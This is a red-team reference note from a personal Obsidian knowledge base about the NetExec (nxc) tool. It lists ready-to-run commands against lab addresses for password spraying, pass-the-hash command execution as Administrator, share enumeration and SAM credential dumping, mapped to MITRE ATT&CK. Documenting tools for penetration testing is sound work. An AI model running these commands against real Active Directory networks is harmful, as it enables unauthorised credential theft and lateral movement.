---
type: tool
room: red
tool_name: "netexec"
version: "v1.x"
platform: [Linux]
phase: [Credential Access, Lateral Movement, Discovery]
tags: [red/tool, red/lateral-movement, red/ad, smb, winrm, ldap]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# netexec (nxc) / crackmapexec

> [!quote]
> *"The game is afoot."*
> — *The Adventure of the Abbey Grange*

**Room:** Red — Instruments | **Phase(s):** `Discovery, Credential Access, Lateral Movement` | **Platform:** `Linux`

---

## The Instrument *(What It Is)*

`NetExec` (`nxc`), the actively maintained successor to `CrackMapExec`, is the premier post-exploitation and network assessment tool for Active Directory environments. Supporting SMB, WinRM, LDAP, SSH, RDP, MSSQL, and FTP, it automates credential spraying, share enumeration, SAM/LSA dumping, pass-the-hash execution, and command execution across entire subnets.

- **Author / Origin:** Pennyw1se, mpgn, and the NetExec Development Team
- **License:** BSD 2-Clause
- **Install:** `sudo apt install netexec` or `pipx install netexec`

---

## The Method *(Core Usage)*

### Basic Syntax
```bash
nxc <protocol> <target(s)> -u <user|userlist> -p <pass|passlist> [options]
```

### Supported Protocols
`smb`, `winrm`, `ldap`, `ssh`, `rdp`, `mssql`, `ftp`, `vnc`

---

## The Cases *(Common Use-Patterns)*

### Case 1 — Password Spraying Active Directory via SMB
```bash
# Check password policy first to avoid lockout
nxc smb 10.10.10.50 -u 'DomainUser' -p 'Pass123' --pass-pol

# Spray one password across all domain users
nxc smb 10.10.10.0/24 -u users.txt -p 'Autumn2024!' --continue-on-success
```

### Case 2 — Pass-The-Hash & Remote Command Execution
```bash
# Authenticate using NTLM hash and execute command as Administrator
nxc smb 10.10.10.50 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" -x "whoami /all"
```

### Case 3 — Share Enumeration & SAM Database Dumping
```bash
# Enumerate readable/writable SMB shares
nxc smb 10.10.10.50 -u user -p password --shares

# Dump local SAM database (requires local admin rights)
nxc smb 10.10.10.50 -u Administrator -p 'Password123' --sam
```

### Case 4 — WinRM Remote Shell Access
```bash
# Verify credentials on WinRM service
nxc winrm 10.10.10.50 -u user -p password
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1110.003` | Brute Force: Password Spraying |
| `T1550.002` | Use Alternate Authentication Material: Pass the Hash |
| `T1021.002` | Remote Services: SMB/Windows Admin Shares |
| `T1003.002` | OS Credential Dumping: Security Account Manager |

---

## Related Notes

- [[Red/Instruments/hashcat|hashcat]]
- [[Red/Instruments/responder|Responder]]
- [[Red/Monographs/TA0008 - Lateral Movement|TA0008 — Lateral Movement]]
- [[Red/Monographs/TA0006 - Credential Access|TA0006 — Credential Access]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
